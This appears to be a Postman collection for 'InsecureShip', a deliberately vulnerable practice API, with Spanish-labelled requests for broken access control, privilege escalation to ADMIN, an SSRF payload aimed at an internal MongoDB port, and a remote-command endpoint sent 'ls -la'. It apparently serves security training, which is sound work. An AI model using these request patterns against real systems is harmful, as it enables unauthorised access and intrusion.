{
  "info": {
    "name": "InsecureShip API",
    "_postman_id": "insecureship-collection-id",
    "description": "Colecci\u00f3n de vulnerabilidades educativas para InsecureShip.",
    "schema": "https://schema.getpostman.com/json/collection/v2.1.0/collection.json"
  },
  "item": [
    {
      "name": "Auth - Login",
      "request": {
        "method": "POST",
        "header": [
          {
            "key": "Content-Type",
            "value": "application/json"
          }
        ],
        "body": {
          "mode": "raw",
          "raw": "{\"username\": \"lucas\", \"password\": \"1234\"}"
        },
        "url": "{{base_url}}/api/auth/login"
      },
      "response": []
    },
    {
      "name": "Users - Ver todos (Broken Access)",
      "request": {
        "method": "GET",
        "header": [
          {
            "key": "Authorization",
            "value": "Bearer {{token}}"
          }
        ],
        "url": "{{base_url}}/api/users/all"
      },
      "response": []
    },
    {
      "name": "Users - Escalada de privilegios",
      "request": {
        "method": "POST",
        "header": [
          {
            "key": "Authorization",
            "value": "Bearer {{token}}"
          },
          {
            "key": "Content-Type",
            "value": "application/json"
          }
        ],
        "body": {
          "mode": "raw",
          "raw": "{\"username\": \"lucas\", \"role\": \"ADMIN\"}"
        },
        "url": "{{base_url}}/api/users/promote"
      },
      "response": []
    },
    {
      "name": "Packages - Crear paquete",
      "request": {
        "method": "POST",
        "header": [
          {
            "key": "Authorization",
            "value": "Bearer {{token}}"
          },
          {
            "key": "Content-Type",
            "value": "application/json"
          }
        ],
        "body": {
          "mode": "raw",
          "raw": "{\"trackingNumber\": \"ABC123\", \"sender\": \"lucas\", \"recipient\": \"maria\", \"address\": \"123 Main Street\", \"status\": \"PENDING\"}"
        },
        "url": "{{base_url}}/api/packages/create"
      },
      "response": []
    },
    {
      "name": "SSRF - Descargar imagen",
      "request": {
        "method": "POST",
        "header": [
          {
            "key": "Authorization",
            "value": "Bearer {{token}}"
          },
          {
            "key": "Content-Type",
            "value": "application/json"
          }
        ],
        "body": {
          "mode": "raw",
          "raw": "{\"imageUrl\": \"http://127.0.0.1:27017\"}"
        },
        "url": "{{base_url}}/api/images/fetch"
      },
      "response": []
    },
    {
      "name": "RCE - Ejecutar comando",
      "request": {
        "method": "POST",
        "header": [
          {
            "key": "Authorization",
            "value": "Bearer {{token}}"
          },
          {
            "key": "Content-Type",
            "value": "application/json"
          }
        ],
        "body": {
          "mode": "raw",
          "raw": "{\"command\": \"ls -la\"}"
        },
        "url": "{{base_url}}/api/utils/exec"
      },
      "response": []
    }
  ],
  "event": [
    {
      "listen": "prerequest",
      "script": {
        "type": "text/javascript",
        "packages": {},
        "exec": [""]
      }
    },
    {
      "listen": "test",
      "script": {
        "type": "text/javascript",
        "packages": {},
        "exec": [""]
      }
    }
  ],
  "variable": [
    {
      "key": "token",
      "value": ""
    },
    {
      "key": "base_url",
      "value": "http://localhost:3000",
      "type": "default"
    }
  ]
}
